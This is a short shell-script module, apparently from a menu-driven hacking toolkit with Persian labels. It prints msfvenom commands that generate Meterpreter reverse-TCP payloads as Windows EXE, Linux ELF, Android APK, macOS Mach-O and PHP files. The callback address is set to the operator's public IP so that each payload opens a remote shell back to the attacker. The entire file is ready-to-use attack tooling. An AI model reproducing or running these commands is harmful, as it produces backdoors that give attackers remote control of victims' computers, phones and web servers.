DESC="ساخت پیلود برای پلتفرم‌های مختلف"
REQ="msfvenom"
RISK="HIGH"

termux(){ echo "msfvenom -l payloads | grep android"; }

kali(){
cat <<'EOF'
LHOST=$(curl -s ifconfig.me)
# ویندوز
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o p.exe
# لینوکس
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o p.elf
# اندروید
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -o p.apk
# مک
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f macho -o p.macho
# پی‌اچ‌پی
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o p.php
EOF
}